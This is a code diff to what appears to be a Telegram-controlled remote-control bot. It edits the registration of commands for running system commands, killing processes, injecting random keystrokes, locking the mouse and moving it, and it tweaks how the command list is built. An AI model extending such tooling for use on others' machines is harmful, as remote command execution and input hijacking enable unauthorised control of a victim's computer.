@@ -601,7 +601,9 @@ class PeppinoTelegram:
             # 💻 System Control
             Command("disk_info", self.get_disk_info, "Sends infos about the connected drives.", "system_control", "💿 List Drives"),
             Command("execute_withoutput", lambda x: self.bsend(self.execute(x, return_output=True, shell=True)), "Execute system command.", "system_control", "⚙️ Execute"),
-            Command("execute", self.execute, "null", "null", "null"),
+
+            Command("execute", self.execute, "Execute a command(helper)", "null", "Execute(helper)"),
+
             Command("processkiller", self.process_killer, "Kill process from list.", "system_control", "💀 Process Killer"),
             Command("terminateprocess", terminate_process_by_name, "Terminate process by name.", "system_control", "🛑 Terminate Process"),
             Command("procmonadd", self.processmonitoradd, "Add process to monitor.", "system_control", "➕ Procmon Add"),
@@ -614,7 +616,12 @@ class PeppinoTelegram:
             Command("randomkeyboard", self.randomkeyboard, "Send random keyboard input.", "input", "🎹 Randomkeyboard"),
             Command("capslock", lambda: toducky("CAPSLOCK", execute=True), "Toggle Caps Lock.", "input", "🔠 Capslock"),
             Command("mouselock", self.mouselock, "Lock mouse position.", "input", "🖱️ Mouselock"),
-            Command("mousecontroller", self.mousecontroller, "Open mouse control menu.", "input", "🎮 Mousecontroller"),
+
+            Command("mouseu", self.mouseu, "Mouse Up.", "null", "Mouse Up."),
+            Command("moused", self.moused, "Mouse Down.", "null", "Mouse Down."),
+            Command("mousel", self.mousel, "Mouse Left.", "null", "Mouse Left."),
+            Command("mouser", self.mouser, "Mouse Right.", "null", "Mouse Right."),
+
             Command("set_mouse_jump", self.setMouseJump, "Set mouse jump distance.", "input", "🎯 Set Mouse Jump"),
             Command("leftclick", self.leftclick, "Left mouse click.", "input", "🖱️ Left Click"),
             Command("rightclick", self.rightclick, "Right mouse click.", "input", "🖱️ Right Click"),
@@ -1122,14 +1129,15 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         for command in self.commands:
             name = command.name
             desc = command.description
+            category = command.category
 
             # category skip
-            if command.category in ("menu", "utility", "testing", "null"):
+            if category in ("menu", "utility", "testing", "null") and name != "menu":
                 continue
 
             # command count limit
             if len(cs) >= TELEGRAM_COMMANDS_LIMIT:
-                print(f"Command error: too many commands (max {TELEGRAM_COMMANDS_LIMIT}).")
+                print(f"Command error: too many commands, max is {TELEGRAM_COMMANDS_LIMIT}, last command was {cs[-1]['command']}.")
                 break
 
             # empty checks
